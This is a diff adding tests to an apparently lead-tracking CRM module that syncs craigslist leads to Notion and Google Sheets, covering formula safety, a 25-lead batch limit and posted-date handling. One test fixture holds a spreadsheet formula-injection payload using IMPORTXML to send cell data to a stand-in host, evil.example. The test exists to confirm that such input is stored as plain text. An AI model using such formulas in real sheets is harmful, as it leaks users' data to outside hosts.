@@ -135,3 +135,32 @@ test('listing asks Notion for best score first, filtered by tier', async () => {
   assert.equal(q.args.page_size, 5);
   assert.ok(leads.length > 0 && typeof leads[0].name === 'string');
 });
+
+test('the Sheet gets plain text: a cell starting with "=" can never run as a formula', async () => {
+  calls.length = 0;
+  await crm.upsertLeads(user, [lead({ name: '=IMPORTXML("https://evil.example/x?"&A1,"//a")', url: 'https://reno.craigslist.org/x/formula.html', category: 'Handyman' })]);
+  const app = calls.find((x) => x.slug === 'GOOGLESHEETS_SPREADSHEETS_VALUES_APPEND')!;
+  assert.equal(app.args.valueInputOption, 'RAW');
+});
+
+test('more than 25 leads: the extra ones are reported back, not silently dropped', async () => {
+  const many = Array.from({ length: 27 }, (_, i) => lead({ name: `Bulk ${i}`, url: `https://reno.craigslist.org/x/bulk${i}.html`, score: 20 }));
+  const r = await crm.upsertLeads(user, many);
+  assert.equal(r.added + r.updated + r.unchanged, 25);
+  assert.deepEqual(r.failed.map((f) => f.name), ['Bulk 25', 'Bulk 26']);
+  assert.match(r.failed[0].error, /25-per-call limit/);
+});
+
+test('a posted date is kept as written, not moved to the next day by UTC', async () => {
+  calls.length = 0;
+  await crm.upsertLeads(user, [lead({ name: 'Evening post', url: 'https://reno.craigslist.org/x/evening.html', posted: '2026-11-25T20:30:00-0800' })]);
+  const ins = calls.find((x) => x.slug === 'NOTION_INSERT_ROW_DATABASE')!;
+  assert.equal(valueOf(ins.args.properties, 'Posted'), '2026-11-25');
+});
+
+test('an impossible posted date is left out rather than rolled over to another day', async () => {
+  calls.length = 0;
+  await crm.upsertLeads(user, [lead({ name: 'Bad date', url: 'https://reno.craigslist.org/x/baddate.html', posted: '2026-02-30' })]);
+  const ins = calls.find((x) => x.slug === 'NOTION_INSERT_ROW_DATABASE')!;
+  assert.equal(valueOf(ins.args.properties, 'Posted'), undefined);
+});
